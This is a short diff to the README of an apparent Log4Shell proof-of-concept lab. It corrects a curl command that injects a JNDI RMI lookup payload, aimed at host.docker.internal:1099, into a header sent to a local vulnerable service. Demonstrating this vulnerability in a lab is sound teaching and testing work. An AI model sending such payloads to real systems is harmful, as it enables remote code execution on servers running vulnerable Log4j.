@@ -95,7 +95,7 @@ Log4Shell PoC with RMI, LDAP
 
 ### [Exploit] Log4Shell using RMI
 ```bash
-curl localhost:7777/log -H 'msg: ${jndi://host.docker.internal:1099/Service'
+curl localhost:7777/log -H 'msg: ${jndi:rmi://host.docker.internal:1099/Services}'
 ```
 
 ### [Exploit] Log4Shell using LDAP
